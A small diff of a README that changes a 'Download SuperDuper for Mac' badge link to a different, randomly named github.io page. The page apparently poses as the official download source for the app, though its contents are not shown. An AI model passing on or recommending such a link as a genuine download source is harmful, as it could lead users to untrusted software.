@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://christalse0404.github.io/.github/superduper">  
+<a href="https://ppowynzb34qx51.github.io/.github/superduper">  
 <img src="https://img.shields.io/badge/Download_SuperDuper_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Download SuperDuper for Mac">  
 </a>  
 </div>  
